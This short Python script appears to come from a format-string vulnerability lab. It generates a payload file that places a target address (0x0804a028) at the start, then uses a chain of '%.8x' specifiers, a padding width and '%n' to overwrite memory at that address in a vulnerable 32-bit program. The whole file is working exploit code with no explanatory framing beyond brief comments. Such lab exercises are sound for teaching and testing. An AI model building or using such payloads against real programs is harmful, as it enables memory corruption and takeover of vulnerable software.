#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray()

number = 0x0804a028
content[0:4] = (number).to_bytes(4,byteorder='little')

# 45 = BUF_SIZE / 4 + 4 - 1
# 613 = 0x400 - 0x1a3 + 8
s = "." + "%.8x."*45 + "%.613x.%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
file = open("payload_modify2", "wb")
file.write(content)
file.close()
